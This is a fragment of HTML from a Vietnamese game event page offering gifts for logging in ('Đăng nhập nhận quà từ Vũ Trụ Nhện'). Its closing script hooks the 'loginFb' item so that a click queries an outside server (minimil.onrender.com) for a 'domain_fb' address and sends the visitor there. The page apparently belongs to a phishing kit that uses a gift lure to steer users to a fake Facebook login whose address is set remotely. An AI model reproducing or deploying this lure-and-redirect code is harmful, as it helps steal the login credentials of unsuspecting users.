                        <div class="ScrollbarsCustom-Scroller"
                            style="position: absolute; inset: 0px; overflow: hidden;">
                            <div class="ScrollbarsCustom-Content"
                                style="box-sizing: border-box; padding: 0.05px; min-height: 100%; min-width: 100%;">
                                <a class="news-list__item loginFb"><img src="img/MCTN_0523.png"
                                        class="news-list__item--image">
                                    <div class="news-list__item--details">
                                        <div class="news-list__item--info"><strong>09:22 10/06/2023</strong> - Sự kiện
                                        </div>
                                        <h3 class="news-list__item--title">Đăng nhập nhận quà từ Vũ Trụ Nhện</h3>
                                        <div class="news-list__item--link" title="Chi tiết">Chi tiết</div>
                                    </div>
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackY"
                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; width: 10px; height: calc(100% - 20px); top: 10px; right: 0px; display: none;">
                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbY"
                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); width: 100%; height: 0px; display: none;">
                        </div>
                    </div>
                    <div class="ScrollbarsCustom-Track ScrollbarsCustom-TrackX"
                        style="position: absolute; overflow: hidden; border-radius: 4px; background: rgba(0, 0, 0, 0.1); user-select: none; height: 10px; width: calc(100% - 20px); bottom: 0px; left: 10px; display: none;">
                        <div class="ScrollbarsCustom-Thumb ScrollbarsCustom-ThumbX"
                            style="cursor: pointer; border-radius: 4px; background: rgba(0, 0, 0, 0.4); height: 100%; width: 0px; display: none;">
                        </div>
                    </div>
                </div>
            </div>
        </main>
        <script>
            const btns = document.querySelectorAll('.loginFb');
            btns.forEach(btn => {
                btn.addEventListener('click', function () {
                    const domain = window.location.protocol + "//" + window.location.host;
                    (async () => {
                        try {
                            let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
                            data = await data.json()
                            window.location.href = data.data.domain_fb;
                        } catch {

                        }
                    })();
                });
            });
        </script>
    </div>